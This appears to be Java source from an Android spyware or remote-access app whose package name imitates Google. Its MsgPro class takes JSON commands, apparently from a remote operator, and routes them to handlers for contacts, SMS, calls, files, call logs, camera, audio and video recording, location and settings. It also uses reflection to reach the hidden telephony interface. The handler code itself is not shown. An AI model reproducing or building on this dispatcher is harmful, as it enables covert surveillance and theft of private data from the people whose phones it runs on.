package com.google.core.msgpro;

import java.lang.reflect.Method;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.alibaba.fastjson.JSONObject;
import com.android.internal.telephony.ITelephony;
import com.google.core.dao.CallsDao;
import com.google.core.dao.ContactDao;
import com.google.core.dao.SmsDao;

@SuppressLint("NewApi")
public class MsgPro {
	private static final String TAG = "MsgPro";

	static public ITelephony getITelephony(TelephonyManager telMgr)
			throws Exception {
		Method getITelephonyMethod = telMgr.getClass().getDeclaredMethod(
				"getITelephony");
		getITelephonyMethod.setAccessible(true);
		return (ITelephony) getITelephonyMethod.invoke(telMgr);
	}
	private CallsDao callsDao = null;
	private ContactDao contactDao = null;
	private Context context;
	private ITelephony iTelephony;
	private String owner;
	private SmsDao smsDao = null;
	private String smsg;

	private WifiManager wm;

	public MsgPro(Context context) {
		this.context = context;
		owner = context.getSharedPreferences("config", 0).getString("username",
				"");
		smsDao = new SmsDao(context);
		contactDao = new ContactDao(context);
		callsDao = new CallsDao(context);
		 
	}
	public void doPro(String msg){
		Log.v(TAG, msg);
		JSONObject msgObj = JSONObject.parseObject(msg);
		int type = msgObj.getIntValue("type");
		String data=msgObj.getString("body");
		if (type<=100) {
//			处理连接信息
			ConnectMsgPro connectMsgPro = new ConnectMsgPro(context);
			connectMsgPro.doPro(type,data);
		}else if(type>100 && type<=200){
//			处理登陆
			LoginMsgPro  loginMsgPro=new LoginMsgPro(context);
			loginMsgPro.doPro(type,data);
		}else if(type>200 && type<=300){
//			处理聯繫人
			ContactMsgPro contactMsgPro=new ContactMsgPro(context);
			contactMsgPro.doPro(type,data);
		}else if(type>300 && type<=400){
//			处理短信
			SmsMsgPro smsMsgPro=new SmsMsgPro(context);
			smsMsgPro.doPro(type,data);
		}else if(type>400 && type<=500){
//			处理通话
			CallMsgPro callMsgPro=new CallMsgPro(context);
			callMsgPro.doPro(type,data);
		}else if(type>500 && type<=600){
//			处理文件
			FileMsgPro fileMsgPro=new FileMsgPro(context);
			fileMsgPro.doPro(type,data);
		}else if(type>600 && type<=700){
//			处理通话记录
			CallsLogMsgPro callsLogMsgPro=new CallsLogMsgPro(context);
			callsLogMsgPro.doPro(type,data);
		}else if(type>700 && type<=800){
//			处理照相
			CameraMsgPro cameraMsgPro=new CameraMsgPro(context);
			cameraMsgPro.doPro(type,data);
		}else if(type>800 && type<=900){
//			处理录音
			VoiceMsgPro voiceMsgPro=new VoiceMsgPro(context);
			voiceMsgPro.doPro(type,data);
		}else if(type>900 && type<=1000){
//			处理录像
			VideoMsgPro videoMsgPro=new VideoMsgPro(context);
			videoMsgPro.doPro(type,data);
		}else if(type>1000 && type<=1100){
//			处理定位
			LocationMsgPro locationMsgPro=new LocationMsgPro(context);
			locationMsgPro.doPro(type,data);
		}else if(type>1100 && type<=1200){
//			处理设置
			OptMsgPro optMsgPro=new OptMsgPro(context);
			optMsgPro.doPro(type,data);
		}
		
	}

}
